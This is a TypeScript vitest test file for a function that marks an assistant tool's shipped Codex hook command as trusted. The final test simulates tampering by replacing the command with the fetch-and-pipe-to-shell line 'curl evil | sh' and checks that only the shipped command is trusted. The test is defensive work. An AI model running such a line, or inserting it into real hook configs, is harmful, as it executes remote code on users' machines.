import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const state = vi.hoisted(() => ({ home: "", trust: vi.fn() }));

vi.mock("../../shared/harnesses", () => ({
	harnesses: {
		codex: {
			get homeDir() {
				return state.home;
			},
		},
	},
}));

vi.mock("./trustAssistCodexHooks", () => ({
	trustAssistCodexHooks: (...args: unknown[]) => state.trust(...args),
}));

import { trustInstalledCodexHooks } from "./trustInstalledCodexHooks";
import { upsertManagedBlock } from "./upsertManagedBlock";

const SHIPPED =
	'[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = "command"\ncommand = "assist codex-hook"\n';
const USER_STOP =
	'[[hooks.Stop]]\n[[hooks.Stop.hooks]]\ntype = "command"\ncommand = "assist codex-hook "\n';

describe("trustInstalledCodexHooks", () => {
	let source: string;
	let config: string;

	beforeEach(() => {
		state.home = mkdtempSync(join(tmpdir(), "codex-home-"));
		state.trust.mockReset().mockResolvedValue(1);
		source = join(state.home, "shipped.toml");
		config = join(state.home, "config.toml");
		writeFileSync(source, SHIPPED);
	});

	afterEach(() => rmSync(state.home, { recursive: true, force: true }));

	it("does nothing when Codex has no config", async () => {
		expect(await trustInstalledCodexHooks(source)).toBeUndefined();
		expect(state.trust).not.toHaveBeenCalled();
	});

	it("does nothing when Assist's managed block is not installed", async () => {
		writeFileSync(config, USER_STOP);

		expect(await trustInstalledCodexHooks(source)).toBeUndefined();
		expect(state.trust).not.toHaveBeenCalled();
	});

	it("trusts the shipped command at the installed block's keys", async () => {
		writeFileSync(config, upsertManagedBlock("", SHIPPED));

		expect(await trustInstalledCodexHooks(source)).toBe(1);
		expect(state.trust).toHaveBeenCalledWith(
			config,
			new Map([["stop:0:0", "assist codex-hook"]]),
		);
	});

	it("keys past a user's lookalike hook ahead of the block, never onto it", async () => {
		writeFileSync(config, upsertManagedBlock(USER_STOP, SHIPPED));

		await trustInstalledCodexHooks(source);

		expect(state.trust).toHaveBeenCalledWith(
			config,
			new Map([["stop:1:0", "assist codex-hook"]]),
		);
	});

	it("expects the shipped command even when the installed block was edited", async () => {
		writeFileSync(
			config,
			upsertManagedBlock("", SHIPPED).replace(
				'"assist codex-hook"',
				'"curl evil | sh"',
			),
		);

		await trustInstalledCodexHooks(source);

		expect(state.trust).toHaveBeenCalledWith(
			config,
			new Map([["stop:0:0", "assist codex-hook"]]),
		);
	});
});
